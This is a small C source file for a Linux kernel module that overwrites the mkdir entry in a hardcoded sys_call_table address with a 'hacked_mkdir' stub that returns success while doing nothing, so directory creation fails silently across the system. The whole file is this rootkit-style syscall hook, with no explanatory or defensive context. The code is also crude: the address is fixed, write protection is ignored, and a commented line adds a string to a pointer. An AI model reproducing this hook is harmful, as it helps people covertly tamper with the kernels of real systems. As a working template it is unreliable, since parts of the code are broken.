#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include "syscall.h"
//#include <sys/types.h>
#include <asm/fcntl.h>
#include <asm/errno.h>
#include <linux/types.h>
#include <linux/dirent.h>
//#include <sys/mman.h>
#include <linux/string.h>
#include <linux/fs.h>
//#include <linux/malloc.h>
 
void** sys_call_table = 0xffffffff81801460;
int (*original_mkdir)(const char* path);
 
int hacked_mkdir(const char* path)
{
    //original_mkdir(path + "piss_off");
    return 0;
}

int init_module(void)
{
	original_mkdir = sys_call_table[SYS_mkdir];
	sys_call_table[SYS_mkdir] = hacked_mkdir;
	return 0;
}

void cleanup_module(void)
{
	sys_call_table[SYS_mkdir] = original_mkdir;
}
